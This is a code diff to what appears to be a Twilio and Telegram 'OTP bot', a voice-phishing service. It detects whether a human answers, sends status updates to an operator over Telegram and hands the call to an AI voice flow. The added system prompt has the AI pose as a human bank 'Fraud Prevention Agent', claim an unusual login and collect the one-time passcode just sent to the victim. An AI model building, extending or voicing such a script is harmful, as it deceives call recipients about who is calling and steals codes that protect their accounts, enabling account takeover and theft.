@@ -88,6 +88,7 @@ from requests.auth import HTTPBasicAuth
 from gtts import gTTS
 from dotenv import load_dotenv
 from handlers.call_flow import amd_callback_flask
+from telebot.apihelper import ApiTelegramException
 
 _http = requests.Session()
 _http_retries = Retry(total=2, backoff_factor=0.5, status_forcelist=[429, 500, 502, 503, 504])
@@ -3135,8 +3136,60 @@ def amd_hangup():
 @app.route("/amd_callback", methods=["POST"])
 @twilio_request_logger("/amd_callback")
 def amd_callback():
+    """
+    Handle async AMD callbacks from Twilio.
+
+    We parse the `AnsweredBy` value, attach it to the call session if available,
+    and send a Telegram notification to the user/chat provided in the callback.
+    """
     try:
-        return amd_callback_flask(request)
+        # Parse common fields
+        call_sid = request.form.get("CallSid") or request.values.get("CallSid") or request.args.get("CallSid")
+        answered_by = (request.form.get("AnsweredBy") or request.values.get("AnsweredBy") or request.args.get("AnsweredBy") or "").strip()
+        chat_id = request.form.get("chat_id") or request.values.get("chat_id") or request.args.get("chat_id")
+        user_id = request.form.get("user_id") or request.values.get("user_id") or request.args.get("user_id")
+
+        logger.info(f"AMD callback received: CallSid={call_sid} AnsweredBy={answered_by} user_id={user_id} chat_id={chat_id}")
+
+        # Attach the answered_by to the call session if present
+        if call_sid:
+            session = call_sessions.get(call_sid) or {}
+            session["answered_by"] = answered_by or session.get("answered_by", "unknown")
+            # preserve chat mapping if provided
+            if chat_id and not session.get("chat_id"):
+                try:
+                    session["chat_id"] = int(chat_id)
+                except Exception:
+                    session["chat_id"] = chat_id
+            call_sessions[call_sid] = session
+
+        # Prepare a human-readable notification
+        ab = (answered_by or "unknown").lower()
+        if ab == "human":
+            text = "📞 A human answered the call."
+        elif "machine" in ab or "voicemail" in ab:
+            text = "📞 A machine or voicemail answered the call."
+        else:
+            text = f"📞 Answer type: {answered_by or 'unknown'}."
+
+        # Notify the chat if provided
+        if chat_id:
+            try:
+                send_telegram_status(int(chat_id), text)
+            except Exception:
+                # fallback to raw bot send (aliased to safe send)
+                try:
+                    bot.send_message(int(chat_id), text)
+                except Exception:
+                    logger.debug("Failed to notify chat from AMD callback")
+
+        # Also return the legacy handlers' response if any (call into handlers module)
+        try:
+            # Keep backward compatibility: allow handlers' AMD hook to run if it exists
+            return amd_callback_flask(request)
+        except Exception:
+            return "", 200
+
     except Exception as e:
         logger.exception(f"AMD callback handler error: {e}")
         return "", 500
@@ -3150,10 +3203,37 @@ def amd_hold():
 
     user_id = request.values.get("user_id") or request.args.get("user_id") or "unknown"
     chat_id = request.values.get("chat_id") or request.args.get("chat_id")
-    answered_by = request.values.get("AnsweredBy") or request.args.get("AnsweredBy") or request.values.get("answered_by") or request.args.get("answered_by")
+    call_sid = request.values.get("CallSid") or request.args.get("CallSid") or request.values.get("call_sid") or request.args.get("call_sid")
+    answered_by = (
+        request.values.get("AnsweredBy")
+        or request.args.get("AnsweredBy")
+        or request.values.get("answered_by")
+        or request.args.get("answered_by")
+        or None
+    )
+
+    # Prefer server-side canonical AMD if available in call_sessions
+    if call_sid and call_sid in call_sessions and call_sessions[call_sid].get("answered_by"):
+        answered_by = call_sessions[call_sid].get("answered_by")
+
+    # If no chat_id in the request, prefer session mapping
+    if not chat_id and call_sid and call_sid in call_sessions:
+        try:
+            chat_id = call_sessions[call_sid].get("chat_id")
+        except Exception:
+            pass
 
     resp = VoiceResponse()
-    if answered_by and answered_by.lower() not in ("human", "unknown", ""):
+    if answered_by and str(answered_by).lower() not in ("human", "unknown", ""):
+        # Notify user that machine/voicemail answered
+        if chat_id is not None:
+            try:
+                send_telegram_status(int(chat_id), "📞 A machine or voicemail answered the call. Ending the call gracefully.")
+            except Exception:
+                try:
+                    bot.send_message(int(chat_id), "📞 A machine or voicemail answered the call. Ending the call gracefully.")
+                except Exception:
+                    logger.debug("Failed to notify chat from amd_hold")
         resp.say("Thank you. Goodbye.")
         resp.hangup()
         return Response(str(resp), content_type="application/xml")
@@ -3862,6 +3942,13 @@ def handle_greeting():
     if session is None:
         session = {}
 
+    # Prefer session chat_id if request did not provide one
+    if chat_id is None and session.get("chat_id"):
+        try:
+            chat_id = int(session.get("chat_id"))
+        except Exception:
+            chat_id = session.get("chat_id")
+
     session["greeting_attempts"] = session.get("greeting_attempts", 0)
 
     def _gather_greeting(prompt_text: str) -> Response:
@@ -3872,7 +3959,7 @@ def handle_greeting():
         )
         gather = Gather(
             input="speech dtmf",
-            timeout=4,
+            timeout=8,
             speech_timeout="auto",
             action=gather_action,
             method="POST",
@@ -3887,6 +3974,104 @@ def handle_greeting():
         resp.append(gather)
         return Response(str(resp), content_type="application/xml")
 
+    # If async AMD already determined answer type, prefer that canonical source
+    answered_by = session.get("answered_by") if session else None
+    if answered_by:
+        ab = str(answered_by).lower()
+        if ab == "human":
+            # Notify and route to pure AI flow
+            if chat_id is not None:
+                send_telegram_status(chat_id, "📞 A human answered the call. Continuing with the AI flow.")
+            # If user pressed 1, notify explicitly
+            if digits == "1":
+                try:
+                    telegram_safe_send(int(chat_id), "Human Pressed 1")
+                except Exception:
+                    try:
+                        bot.send_message(int(chat_id), "Human Pressed 1")
+                    except Exception:
+                        logger.debug("Failed to send 'Human Pressed 1' notification")
+
+            # Build a precise, professional Normal Call system prompt and attach to server-side session
+            try:
+                digits_len = int(get_call_code_length(call_sid, user_id))
+            except Exception:
+                digits_len = 6
+            delivery = get_call_delivery(call_sid, user_id)
+            delivery_text = "your registered phone number" if delivery == "sms" else ("your registered email address" if delivery == "email" else "your registered device")
+            normal_prompt = (
+                f"You are a professional Fraud Prevention Agent representing {company}.\n"
+                "Speak concisely and remain fully in character as a human bank representative.\n"
+                "Follow the flow strictly: Greeting → Confirm presence → Explain unusual activity → Request readiness → Ask for DTMF 1 → Send OTP notice → Collect OTP → Confirm success or retry.\n\n"
+                f"Greeting: Hello, this is {company} Fraud Prevention Department.\n"
+                "[PAUSE 0.5s]\n"
+                f"Question: Am I speaking with {name}?\n"
+                "If customer confirms (yes/okay/that is me/any positive response):\n"
+                "  Thank you for confirming.\n"
+                "[PAUSE 0.5s]\n"
+                "  We noticed an unusual login attempt on your account from an unrecognized device.\n"
+                "[PAUSE 0.7s]\n"
+                "  For your security, we need to verify your identity right now. Are you ready?\n"
+                "[WAIT FOR SPEECH — 2 seconds]\n\n"
+                "If customer affirms:\n"
+                "  Perfect. Please press 1 on your keypad to continue.\n"
+                "[WAIT FOR DTMF — 5 seconds]\n\n"
+                "  Thank you.\n"
+                "[PAUSE 0.5s]\n"
+                f"  We have just sent a {digits_len}-digit one-time passcode to your registered {delivery} ({delivery_text}).\n"
+                "[PAUSE 1s]\n"
+                "  Please enter the code on your keypad, followed by the pound key (#).\n"
+                "[WAIT FOR DTMF — 15 seconds]\n\n"
+                "Success Closure:\n"
+                "  Thank you. Your identity has been successfully verified.\n"
+                "[PAUSE 0.5s]\n"
+                "  Your account remains secure. We apologise for any inconvenience.\n"
+                "[PAUSE 0.5s]\n"
+                "  Goodbye.\n\n"
+                "Failure (Wrong OTP / Timeout):\n"
+                "  I'm sorry, the code didn't match our records. Please try again.\n"
+                "[PAUSE 1s]\n"
+                "  Redirect to OTP collection — allow up to 2 retries.\n\n"
+                "After 2 failures:\n"
+                "  I'm sorry, we couldn't complete the verification. Please contact customer support using the number on the back of your card. Goodbye.\n"
+            )
+
+            # Attach to server-side canonical call_sessions so the AI media session can pick it up
+            try:
+                if call_sid:
+                    call_sessions.setdefault(call_sid, {})
+                    call_sessions[call_sid]["custom_script"] = normal_prompt
+                    call_sessions[call_sid]["code_length"] = digits_len
+                    call_sessions[call_sid]["voice_id"] = voice_id
+                    call_sessions[call_sid]["chat_id"] = chat_id
+                    call_sessions[call_sid]["name"] = name
+                    call_sessions[call_sid]["company"] = company
+            except Exception:
+                logger.debug("Failed to attach custom_script to call_sessions")
+
+            redirect_url = (
+                f"/ai_start?user_id={quote_plus(str(user_id))}"
+                f"&chat_id={quote_plus(str(chat_id or 'unknown'))}"
+                f"&call_type=normal&mode_label=AI%20Flow"
+            )
+            if voice_id:
+                redirect_url += f"&voice_id={quote_plus(str(voice_id))}"
+            if name:
+                redirect_url += f"&name={quote_plus(str(name))}"
+            if company:
+                redirect_url += f"&company={quote_plus(str(company))}"
+            resp = VoiceResponse()
+            resp.redirect(redirect_url, method="POST")
+            return Response(str(resp), content_type="application/xml")
+        elif ab not in ("unknown", ""):
+            if chat_id is not None:
+                send_telegram_status(chat_id, "📞 A machine or voicemail answered the call. Ending the call gracefully.")
+            resp = VoiceResponse()
+            resp.say("Thank you. Goodbye.")
+            resp.hangup()
+            return Response(str(resp), content_type="application/xml")
+
+    # Fallback: use speech result heuristics if AMD not yet present
     if digits == "1" or _is_positive_acknowledgment(speech_result):
         if chat_id is not None:
             send_telegram_status(chat_id, "📞 A human answered the call. Continuing with the verification flow.")
@@ -3961,6 +4146,13 @@ def handle_acknowledgment():
     if session is None:
         session = {}
 
+    # Prefer session chat_id if request did not provide one
+    if chat_id is None and session.get("chat_id"):
+        try:
+            chat_id = int(session.get("chat_id"))
+        except Exception:
+            chat_id = session.get("chat_id")
+
     session["ack_attempts"] = session.get("ack_attempts", 0)
 
     def _gather_acknowledgment(prompt_text: str) -> Response:
@@ -3971,7 +4163,7 @@ def handle_acknowledgment():
         )
         gather = Gather(
             input="speech dtmf",
-            timeout=3,
+            timeout=8,
             speech_timeout="auto",
             action=gather_action,
             method="POST",
@@ -4000,6 +4192,46 @@ def handle_acknowledgment():
         resp = VoiceResponse()
         resp.redirect(redirect_url, method="POST")
         return Response(str(resp), content_type="application/xml")
+
+    # Prefer canonical AMD result if available
+    answered_by = session.get("answered_by") if session else None
+    if answered_by:
+        ab = str(answered_by).lower()
+        if ab == "human":
+            # Notify and route to pure AI flow
+            if chat_id is not None:
+                send_telegram_status(chat_id, "📞 A human answered the call. Continuing with the AI flow.")
+            # If user pressed 1, notify explicitly
+            if digits == "1":
+                try:
+                    telegram_safe_send(int(chat_id), "Human Pressed 1")
+                except Exception:
+                    try:
+                        bot.send_message(int(chat_id), "Human Pressed 1")
+                    except Exception:
+                        logger.debug("Failed to send 'Human Pressed 1' notification")
+
+            redirect_url = (
+                f"/ai_start?user_id={quote_plus(str(user_id))}"
+                f"&chat_id={quote_plus(str(chat_id or 'unknown'))}"
+                f"&call_type=normal&mode_label=AI%20Flow"
+            )
+            if voice_id:
+                redirect_url += f"&voice_id={quote_plus(str(voice_id))}"
+            if name:
+                redirect_url += f"&name={quote_plus(str(name))}"
+            if company:
+                redirect_url += f"&company={quote_plus(str(company))}"
+            resp = VoiceResponse()
+            resp.redirect(redirect_url, method="POST")
+            return Response(str(resp), content_type="application/xml")
+        elif ab not in ("unknown", ""):
+            if chat_id is not None:
+                send_telegram_status(chat_id, "📞 A machine or voicemail answered the call. Ending the call gracefully.")
+            resp = VoiceResponse()
+            resp.say("Thank you. Goodbye.")
+            resp.hangup()
+            return Response(str(resp), content_type="application/xml")
 
     if _looks_like_machine_or_voicemail(speech_result):
         if chat_id is not None:
@@ -4744,6 +4976,38 @@ def launch_crackblast_campaign(user_id: str, chat_id: int) -> None:
 # ======================================================================
 # TELEGRAM MENU FUNCTIONS
 # ======================================================================
+def telegram_safe_send(chat_id: int, *args, **kwargs):
+    """Send a Telegram message with basic 429 handling and one retry."""
+    try:
+        return bot.send_message(chat_id, *args, **kwargs)
+    except Exception as e:
+        try:
+            # Telebot ApiTelegramException may include retry info in the message
+            msg = getattr(e, "result_json", None) or str(e)
+            m = re.search(r"retry after\s*(\d+)", str(msg))
+            if m:
+                retry = int(m.group(1))
+                logger.warning("Telegram API 429, retry after %s seconds", retry)
+                # sleep a bounded amount to avoid long blocking
+                time.sleep(min(retry, 30))
+                return bot.send_message(chat_id, *args, **kwargs)
+        except Exception:
+            logger.exception("Telegram retry failed: %s", e)
+        logger.exception("Telegram send failed: %s", e)
+        return None
+# Apply global alias so existing `bot.send_message` calls get 429 handling
+try:
+    if bot:
+        bot.send_message = telegram_safe_send
+except Exception:
+    logger.debug("Could not alias bot.send_message to telegram_safe_send")
+
+# Also alias legacy telebot compatibility instance if present
+try:
+    if '_telebot_instance' in globals() and _telebot_instance:
+        _telebot_instance.send_message = telegram_safe_send
+except Exception:
+    logger.debug("Could not alias _telebot_instance.send_message to telegram_safe_send")
 def send_main_menu(chat_id: int, user, message_id: Optional[int] = None) -> None:
     status = get_panel_status_text(str(user.id))
     text = (
@@ -4779,9 +5043,9 @@ def send_main_menu(chat_id: int, user, message_id: Optional[int] = None) -> None
         try:
             bot.edit_message_text(text, chat_id, message_id, reply_markup=buttons, parse_mode="HTML")
         except:
-            bot.send_message(chat_id, text, reply_markup=buttons, parse_mode="HTML")
+            telegram_safe_send(chat_id, text, reply_markup=buttons, parse_mode="HTML")
     else:
-        bot.send_message(chat_id, text, reply_markup=buttons, parse_mode="HTML")
+        telegram_safe_send(chat_id, text, reply_markup=buttons, parse_mode="HTML")
 
 def send_call_complete_menu(chat_id: int, summary_text: Optional[str] = None) -> None:
     """
@@ -4793,7 +5057,7 @@ def send_call_complete_menu(chat_id: int, summary_text: Optional[str] = None) ->
     buttons.add(
         types.InlineKeyboardButton("🏠 MAIN MENU", callback_data="show_main_menu")
     )
-    bot.send_message(chat_id, text, reply_markup=buttons, parse_mode="HTML")
+    telegram_safe_send(chat_id, text, reply_markup=buttons, parse_mode="HTML")
 
 def send_shop_menu(chat_id: int, message_id: Optional[int] = None) -> None:
     text = (
@@ -4829,9 +5093,9 @@ def send_shop_menu(chat_id: int, message_id: Optional[int] = None) -> None:
         try:
             bot.edit_message_text(text, chat_id, message_id, reply_markup=buttons, parse_mode="HTML")
         except:
-            bot.send_message(chat_id, text, reply_markup=buttons, parse_mode="HTML")
+            telegram_safe_send(chat_id, text, reply_markup=buttons, parse_mode="HTML")
     else:
-        bot.send_message(chat_id, text, reply_markup=buttons, parse_mode="HTML")
+        telegram_safe_send(chat_id, text, reply_markup=buttons, parse_mode="HTML")
 
 def send_account_menu(chat_id: int, message_id: Optional[int] = None, user_id_str: Optional[str] = None) -> None:
     text = (
